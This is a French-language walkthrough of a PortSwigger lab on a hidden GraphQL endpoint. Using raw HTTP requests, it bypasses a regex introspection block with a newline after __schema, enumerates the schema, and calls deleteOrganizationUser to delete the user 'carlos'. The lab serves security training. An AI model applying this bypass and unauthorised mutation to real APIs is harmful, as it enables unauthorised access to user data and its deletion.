# Lab

https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint

## Solution

Avec le scanner Burp on trouve un endpoint GraphQL à `/api` :

```http
GET /api?query=query%7b__typename%7d HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{
  "data": {
    "__typename": "query"
  }
}
```

On essaie de trouver des informations sur les champs disponibles via introspection :

```http
GET /api?query=query+{__schema{queryType{name,+fields{name,+args{name,+type{name}}}}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 156

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

On peut bypasser cette restriction en utilisant ajoutant un espace après `__schema` qui fonctionnera si le contrôle est fait avec une regex :

```http
GET /api?query=query+{__schema+{queryType{name,+fields{name,+args{name,+type{name}}}}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 156

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

Ca ne fonctionne pas mais on peut essayer avec un retour à la ligne :

```http
GET /api?query=query+{__schema%0d%0a{types{name,+fields{name,+args{name,+type{name}}}}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 355

{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query",
        "fields": [
          {
            "name": "getUser",
            "args": [
              {
                "name": "id",
                "type": {
                  "name": null
                }
              }
            ]
          }
        ]
      }
    }
  }
}
```

Maintenant on peut utiliser la query `getUser` pour récupérer les informations de l'utilisateur :

```http
GET /api?query=query+{getUser(id:1){id,username}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 91

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator"
    }
  }
}
```

Avec une autre requête on trouve que l'utilisateur `carlos` a l'identifiant `3` :

```json
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

On cherche les mutations disponibles :

```http
GET /api?query=query+{__schema%0A{mutationType{name,+fields{name,+args{name,+type{name}}}}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 404

{
  "data": {
    "__schema": {
      "mutationType": {
        "name": "mutation",
        "fields": [
          {
            "name": "deleteOrganizationUser",
            "args": [
              {
                "name": "input",
                "type": {
                  "name": "DeleteOrganizationUserInput"
                }
              }
            ]
          }
        ]
      }
    }
  }
}
```

On peut donc utiliser la mutation `deleteOrganizationUser` pour supprimer l'utilisateur `carlos`. Mais on doit savoir quels inputs sont nécessaires pour que la mutation fonctionne :

```http
GET /api?query=query+{__type%0a(name:%22DeleteOrganizationUserInput%22){name,+inputFields{name,+type{name}}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 218

{
  "data": {
    "__type": {
      "name": "DeleteOrganizationUserInput",
      "inputFields": [
        {
          "name": "id",
          "type": {
            "name": null
          }
        }
      ]
    }
  }
}
```

On peut donc supprimer l'utilisateur `carlos` :

```http
GET /api?query=mutation+{deleteOrganizationUser(input:{id:3}){user{id}}} HTTP/2
Host: 0af6007404bfd909816bbb6b00f30031.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=87TgngV7eCBjdgA1RDasWO40pmNridog
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 97

{
  "data": {
    "deleteOrganizationUser": {
      "user": {
        "id": 3
      }
    }
  }
}
```

Le payload en clair est :

```graphql
mutation {
  deleteOrganizationUser(input: {id: 3}) {
    user {
      id
    }
  }
}
```